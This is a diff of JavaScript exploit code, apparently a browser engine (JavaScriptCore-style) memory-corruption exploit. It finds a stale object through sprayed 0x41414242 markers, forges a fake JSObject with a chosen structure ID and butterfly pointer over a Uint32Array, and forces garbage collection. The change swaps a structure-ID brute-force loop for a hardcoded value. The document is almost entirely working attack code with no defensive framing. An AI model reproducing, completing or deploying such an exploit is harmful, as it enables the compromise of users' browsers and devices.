@@ -170,30 +170,24 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				//alert("Found the object!!");
-
-				// Leak function pointer
-				//stale[0] = fc;
-				//fcp = bufs[i][k];
-				//alert("Leaked function pointer:" + fcp)
-
-
-				
 				//var original_val = bufs[i][k];
 				//var original_val1 = bufs[i][k+1];
-				alert("Pushed stale");
-				bufs.push(stale);
-				stale[0] = fc;
-				fcp = bufs[i][k];
-				structID = 100;
-				alert("1");
+				//alert("Pushed stale");
+				//bufs.push(stale);
+				//stale[0] = fc;
+				//fcp = bufs[i][k];
+				dgc();
+				dgc();
+				dgc();
+				dgc();
+				
 				stale[0] = {
-					'a': u2d(structID, 0x1172600), // the JSObject properties
+					'a': u2d(105, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
 					'c': smsh, // var smsh = new Uint32Array(0x10)
 					'd': u2d(0x100, 0)
 				}
-				alert("2");
+			
 				/*
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
@@ -219,16 +213,8 @@ function go_() {
 				
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-				alert("3");
-				
-				while(!(stale[0] instanceof Uint32Array)) {
-					alert("4");
-					structID++;
-					stale[1]['a'] = u2d(structID, 0);
-				}
-				alert('found structID for Uint32Array = ' + structID);
-				alert('stale[0] is now: ' + stale[0]);
-				
+				alert("Stage 2")
+			
 				return;
 
 				bck = stale[0][4];
